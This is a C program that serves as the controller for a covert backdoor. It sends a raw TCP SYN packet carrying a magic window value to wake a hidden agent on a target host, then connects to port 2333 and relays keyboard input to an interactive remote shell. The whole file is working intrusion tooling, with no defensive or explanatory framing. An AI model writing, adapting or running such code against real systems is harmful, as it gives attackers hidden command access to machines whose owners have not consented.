#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <time.h>

#define MAGIC_WINDOW 54321
#define AGENT_PORT 2333

/* Calculate TCP and IP checksums */
static unsigned short checksum(void *addr, int count) {
    unsigned long sum = 0;
    unsigned short *ptr = addr;
    while (count > 1) {
        sum += *ptr++;
        count -= 2;
    }
    if (count > 0)
        sum += *(unsigned char *)ptr;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

/* Send a raw TCP SYN packet with the magic window size */
static int send_magic_packet(const char *dst_ip) {
    int sock;
    struct sockaddr_in dest;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    const int packet_len = sizeof(packet);

    /* Create raw socket */
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket (raw)");
        return -1;
    }

    /* IP header */
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(packet_len);
    ip->id = htons(rand() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = 0;   /* will be filled by kernel */
    inet_pton(AF_INET, dst_ip, &ip->daddr);

    /* TCP header */
    tcp->source = htons(12345 + (rand() % 1000));   /* random source port */
    tcp->dest = htons(80);                           /* any destination port */
    tcp->seq = htonl(rand());
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(MAGIC_WINDOW);               /* magic value */
    tcp->check = 0;
    tcp->urg_ptr = 0;

    /* IP checksum (optional, kernel may fill if IP_HDRINCL not set) */
    ip->check = checksum(ip, sizeof(struct iphdr));

    /* TCP checksum – needs pseudo header */
    struct pseudo_header {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t  zero;
        uint8_t  protocol;
        uint16_t tcp_len;
    } psh;
    psh.src_addr = ip->saddr;
    psh.dst_addr = ip->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len = htons(sizeof(struct tcphdr));

    char pseudogram[sizeof(psh) + sizeof(struct tcphdr)];
    memcpy(pseudogram, &psh, sizeof(psh));
    memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr));

    tcp->check = checksum(pseudogram, sizeof(pseudogram));

    /* Destination address */
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    /* Send packet */
    if (sendto(sock, packet, packet_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("sendto");
        close(sock);
        return -1;
    }

    printf("Magic packet sent to %s\n", dst_ip);
    close(sock);
    return 0;
}

/* Connect to agent on port 2333 and forward stdin/stdout */
static void interact_with_agent(const char *dst_ip) {
    int sock;
    struct sockaddr_in addr;
    fd_set fds;
    char buf[4096];
    ssize_t n;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(AGENT_PORT);
    if (inet_pton(AF_INET, dst_ip, &addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return;
    }

    printf("Connected to agent shell on %s:%d\n", dst_ip, AGENT_PORT);
    printf("Type commands (exit to quit)\n");

    while (1) {
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        FD_SET(STDIN_FILENO, &fds);
        int maxfd = (sock > STDIN_FILENO) ? sock : STDIN_FILENO;

        if (select(maxfd + 1, &fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        if (FD_ISSET(sock, &fds)) {
            n = read(sock, buf, sizeof(buf));
            if (n <= 0) {
                if (n == 0)
                    printf("\nConnection closed by agent.\n");
                else
                    perror("read from socket");
                break;
            }
            write(STDOUT_FILENO, buf, n);
        }

        if (FD_ISSET(STDIN_FILENO, &fds)) {
            n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n <= 0) {
                if (n == 0)
                    printf("\nEOF on stdin.\n");
                else
                    perror("read from stdin");
                break;
            }
            write(sock, buf, n);
        }
    }

    close(sock);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];

    /* Seed random for port/seq */
    srand(time(NULL));

    if (send_magic_packet(target_ip) < 0) {
        fprintf(stderr, "Failed to send magic packet.\n");
        return 1;
    }

    /* Small delay to allow packet to be processed */
    usleep(100000);   /* 100 ms */

    interact_with_agent(target_ip);

    return 0;
}
